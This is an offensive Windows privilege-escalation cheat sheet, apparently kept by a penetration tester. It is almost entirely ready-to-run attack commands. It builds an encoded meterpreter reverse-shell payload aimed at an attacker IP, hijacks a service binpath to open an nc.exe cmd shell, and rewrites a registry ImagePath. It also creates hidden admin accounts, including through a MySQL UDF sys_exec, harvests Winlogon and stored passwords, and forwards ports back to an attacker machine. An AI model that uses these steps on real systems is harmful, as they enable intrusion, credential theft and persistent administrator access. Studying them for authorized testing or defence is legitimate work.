#### Task Scheduler
```bash
tasklist /svc
tasklist /v
net start
sc query
schtasks /query /fo LIST 2>nul | findstr TaskName
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=<attackerIP> LPORT=<attackerPort> -f exe -o Payload.exe
upload -f Payload.exe
net start "Task Scheduler"
time - set newtime
at 06:42 /interactive "<Path>\Payload.exe"

## https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
```

#### Unquoted Service Path
```bash
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
icacls "C:\Program Files (x86)\Program Folder"
F = Full Control, CI = Container Inherit, OI = Object Inherit
msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=<attackerIp> LPORT=<attackerPort> -f exe -o Payload.exe
cd "../../../Program Files (x86)/Program Folder"
upload -f Payload.exe
shutdown /r /t 0
getuid

## Follow - https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
```

#### Vulnerable Services and Files and Folder Permission

a. Insecure Service Permission -  Search for services that have a binary path (binpath) property which can be modified by non-Admin users - in that case change the binpath to execute a command of your own.
```
1. Check permission of the file - icalcs <file>
2. Use accesschk.exe - Sysinternal tool -
	a. accesschk.exe -uwcqv "Authenticated Users" * /accepteula
	b. accesschk.exe -qdws "Authenticated Users" C:\Windows\ /accepteula
	c. accesschk.exe -qdws Users C:\Windows\
	d. accesschk.exe -ucqv <Vulnerable_Service>					#1
	e. SERVICE_ALL_ACCESS means we have full control over modifying the properties of Vulnerable Service.
3. sc qc <Vulnerable_Service>										#2
4. sc config <Vulnerable_Service> binpath= "C:\nc.exe -nv 127.0.0.1 <port> -e C:\WINDOWS\System32\cmd.exe"	#3
5. sc config "Vulnerable Service" binpath= "net user <user> <password>@ /add"									#or
6. sc config <Vulnerable_Service> obj= ".\LocalSystem" password= ""	#4	#no need to do if performed #3
7. sc qc <Vulnerable_Service>	#5
8. net start <Vulnerable_Service>	#6
9. Follow - https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
```
**b. Insecure Registry Permissions**
```
1. Use tool - subinacl.exe
2. subinacl.exe /keyreg "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Vulnerable Service" /display
3. msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai LHOST=<attackerIp> LPORT=<attackerPort> -f exe -o Payload.exe
4. upload -f Payload.exe
5. reg add "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Vulnerable Service" /t REG_EXPAND_SZ /v ImagePath /d "<Path>\Payload.exe" /f
6. shutdown /r /t 0
7. getuid
8. reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
```

#### Add user
```powershell
net user hacker hacker /add
net localgroup administrators hacker /add
```

#### Check Firewall
```powershell
netsh firewall show state
netsh firewall show config
netsh advfirewall firewall show rule name=all
netsh advfirewall export "firewall.txt"
```

#### Running Process as Administrator
```powershell
ps aux
**MySQL**
USE mysql;
CREATE TABLE npn(line blob);
INSERT INTO npn values(load_file('<Path>/lib_mysqludf_sys.dll'));
SELECT * FROM mysql.npn INTO DUMPFILE '<Path>/lib_mysqludf_sys_32.dll';
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll';
SELECT sys_exec("net user npn npn12345678 /add");
SELECT sys_exec("net localgroup Administrators npn /add");
## https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/
```

#### DLL Hijacking
```powershell
ps
search -f Vulnerable.exe
download Vulnerable.exe
https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
```
#### Stored Credentials
```powershell
dir c:\*vnc.ini /s /b /c
dir c:\*ultravnc.ini /s /b /c
dir c:\ /s /b /c | fin dstr /si *vnc.ini
findstr /si password *.txt | *.xml | *.ini
findstr /si pass *.txt | *.xml | *.ini
```
#### Kernel Exploits
```powershell
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn
```
#### Port Forwarding
```powershell
Upload plink.exe to target.
Start SSH on your attacking machine.
plink.exe -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
ssh -l root -pw password -R 445:127.0.0.1:445 YOURIPADDRESS
```

#### Metasploit - Post exploitation
```bash
post/windows/gather/enum_patches
post/multi/recon/local_exploit_suggester
https://www.hackingarticles.in/window-privilege-escalation-via-automated-script/
```